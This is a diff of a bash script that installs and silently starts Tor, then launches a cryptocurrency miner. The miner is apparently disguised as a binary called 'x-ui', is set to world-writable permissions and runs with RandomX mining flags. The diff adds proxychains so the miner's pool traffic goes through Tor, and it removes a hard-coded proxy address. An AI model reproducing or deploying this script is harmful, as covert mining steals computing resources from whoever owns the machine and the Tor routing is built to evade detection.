@@ -1,7 +1,7 @@
 #!/bin/bash
 
 sudo apt update
-sudo apt install tor unzip -y
+sudo apt install tor proxychains unzip -y
 
 sudo nohup tor &>/dev/null &
 
@@ -20,8 +20,7 @@ cd x-ui-linux-x64/x-ui-6.16.2
 
 chmod 777 x-ui
 
-./x-ui -a rx -k -o $seed -u $user - px \
+proxychains ./x-ui -a rx -k -o $seed -u $user - px \
 --threads=$cpu --cpu-priority=2 \
 --astrobwt-avx2 --nicehash \
---randomx-wrmsr=-1 --keepalive \
---proxy=173.82.202.224:11028
+--randomx-wrmsr=-1 --keepalive 
